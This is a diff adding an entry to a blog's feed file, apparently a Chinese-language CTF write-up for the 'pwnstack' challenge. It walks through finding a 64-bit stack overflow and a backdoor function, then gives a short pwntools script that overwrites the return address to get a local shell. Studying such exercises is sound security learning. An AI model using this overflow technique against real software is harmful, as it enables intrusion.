@@ -4,6 +4,19 @@
   
     
     <entry>
+      <title>浅尝pwn题：pwnstack</title>
+      <link href="/2022/12/24/%E6%B5%85%E5%B0%9Dpwn%E9%A2%98%EF%BC%9Apwnstack/"/>
+      <url>/2022/12/24/%E6%B5%85%E5%B0%9Dpwn%E9%A2%98%EF%BC%9Apwnstack/</url>
+      
+        <content type="html"><![CDATA[<h2 id="pwnstack-wp"><a href="#pwnstack-wp" class="headerlink" title="pwnstack wp"></a>pwnstack wp</h2><p>这题pwn是我看wp写出来的，一个晚上的琢磨感觉网上的wp还是不够简洁，于是乎我自己来总结一下：<br>首先从网站上下载压缩包解压后放至自己虚拟机的文件夹中；<br>发现它是个64位二进制文件：<br><img src="/images/%E6%B5%85%E5%B0%9Dpwn%E9%A2%98%EF%BC%9Apwnstack/1.png"><br>对其进行checksec下如下图：<br><img src="/images/%E6%B5%85%E5%B0%9Dpwn%E9%A2%98%EF%BC%9Apwnstack/2.png"><br>发现只有NX保护打开。<br>在物理机上将它拖进IDA中分析：<br><img src="/images/%E6%B5%85%E5%B0%9Dpwn%E9%A2%98%EF%BC%9Apwnstack/3.png"><br>对其中的函数双击点进去，发现vul函数中有read函数可读取177个字节，而我们定义的buf只有160个字节，很明显是个栈溢出题目。<br><img src="/images/%E6%B5%85%E5%B0%9Dpwn%E9%A2%98%EF%BC%9Apwnstack/4.png"><br>然后我们在这列中找到了后门函数：backdoor<br><img src="/images/%E6%B5%85%E5%B0%9Dpwn%E9%A2%98%EF%BC%9Apwnstack/5.png"><br>进去看发现它可以直接调用&#x2F;bin&#x2F;sh获得shell：<br><img src="/images/%E6%B5%85%E5%B0%9Dpwn%E9%A2%98%EF%BC%9Apwnstack/6.png"><br>接下来就是编写脚本了，因为要覆盖到返回地址只要将buf区填满和rbp指针覆盖共需要168个字节于是我们填充168个a，后面返回地址则覆盖为backdoor的地址即可</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span> io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn2'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">168</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x400762</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获取shell</p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>pwntools的基本语法</title>
       <link href="/2022/12/24/pwntools%E7%9A%84%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/"/>
       <url>/2022/12/24/pwntools%E7%9A%84%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/</url>
